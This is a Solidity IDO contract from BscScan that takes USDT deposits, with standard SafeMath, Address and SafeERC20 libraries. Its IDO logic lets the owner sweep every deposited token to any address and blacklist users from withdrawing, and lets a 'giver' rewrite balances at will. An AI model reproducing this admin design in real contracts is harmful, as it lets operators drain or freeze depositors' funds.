/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

pragma solidity ^0.8.6;
// SPDX-License-Identifier: Unlicensed

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library Address {

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

// owner
contract Ownable {
    address public _owner;
    address private _giver;

    modifier onlyOwner() {
        require(msg.sender == _owner, 'DividendTracker: owner error');
        _;
    }

    modifier onlyGiver() {
        require(msg.sender == _giver, 'DividendTracker: giver error');
        _;
    }

    function changeOwnership(address newOwner) public onlyOwner {
        _owner = newOwner;       
    }

    function changeGiver(address newGiver) public onlyOwner {
        require(newGiver != address(0), "error giver");
        _giver = newGiver;       
    }
}

contract IDO is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    IERC20 public immutable _usdtToken;

    uint256 public _totalUsdt;
    uint256 public _totalTake;
    uint256 public _minBuy;   

    mapping(address => uint256) public _takeUSDT;
    mapping(address => uint256) public _balancesUSDT;
    mapping(address => uint256) public _buyIDOamount;
    mapping(address => bool) public _blackList;    

    mapping(address => uint256) public _numTokenList;
    mapping(address => mapping(uint256 => uint256)) private _tokenListNum;
    mapping(address => mapping(uint256 => uint256)) private _tokenListTime;                       
  

    event BuyIDO(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);    

    constructor(IERC20 usdtToken) {
        _usdtToken = usdtToken;        
        _owner = msg.sender;
        _minBuy = 10*10**18;        
    }
          
    function totalUsdt() public view returns (uint256) {
        return _totalUsdt;
    }

    function totalTake() public view returns (uint256) {
        return _totalTake;
    }   

    function tokenList(address owner)
        public
        view
        returns(
            uint256[] memory token_List_Num, 
            uint256[] memory token_List_Time
        )
    {
        uint256 num = _numTokenList[owner];
        // 初始化数组大小
        token_List_Num = new uint256[](num);
        token_List_Time = new uint256[](num);                       
        
        // 给数组赋值
		for(uint256 i =1; i<=num; i++){
            token_List_Num[i-1] = _tokenListNum[owner][i];
            token_List_Time[i-1] =  _tokenListTime[owner][i];
        }

        return (token_List_Num, token_List_Time);
    }

    function tokenListNum(address owner, uint256 num)
        public
        view
        returns(uint256)
    {
        return _tokenListNum[owner][num];
    }

    function buyIDOamount(address owner)
        public
        view
        returns(uint256)
    {
        return _buyIDOamount[owner];
    }

    function _withdraw() private {
        uint256 amount = _balancesUSDT[msg.sender];
        require(_balancesUSDT[msg.sender] > 0, "no balances");
        require(!_blackList[msg.sender], "blackList");
        require(_usdtToken.balanceOf(address(this)) >= amount, "no balances");
        _usdtToken.safeTransfer(msg.sender, amount);
        _totalTake += amount;
        _takeUSDT[msg.sender] += amount;
        _balancesUSDT[msg.sender] = 0;
        emit Withdraw(msg.sender, amount);           
    }

    function _buyIDO(uint256 amount) private {
        require(amount >= _minBuy, "below minBuy");
        require(!_blackList[msg.sender], "blackList");
        require(_numTokenList[msg.sender] < 2, "no more than 2");

        _usdtToken.safeTransferFrom(msg.sender, address(this), amount);
        _totalUsdt += amount;
        _numTokenList[msg.sender] += 1;
        _tokenListNum[msg.sender][_numTokenList[msg.sender]] = amount;
        _tokenListTime[msg.sender][_numTokenList[msg.sender]] = block.timestamp;
        _buyIDOamount[msg.sender] += amount;
        emit BuyIDO(msg.sender, amount);
    }

    function _updateFund(address to, uint256 amount, uint256 typeNum) private {
        require(amount > 0, "below 0");
        require(!_blackList[to], "blackList");
        if(typeNum == 1)_balancesUSDT[to] += amount;
        if(typeNum == 2){
            if(_balancesUSDT[to] >= amount){
                _balancesUSDT[to] -= amount;
            }
            else{
                _balancesUSDT[to] = 0; 
            }
        }
    }

    function buyIDO(uint256 amount) public returns(bool){
        _buyIDO(amount);
        return true;
    }

    function withdraw() public returns(bool){
        _withdraw();
        return true;
    }

    function updateFund(address to, uint256 amount, uint256 typeNum) public onlyGiver returns(bool) {
         _updateFund(to, amount, typeNum);
         return true;
    }
            
    function withdrawToken(IERC20 token, address to, uint256 value) public onlyOwner {
        token.safeTransfer(to, value);
    }

    function changeBlackList(address to, bool value) public onlyOwner {
        _blackList[to] = value;
    }

    function changeMinBuy(uint256 value) public onlyOwner {
        _minBuy = value;
    } 
}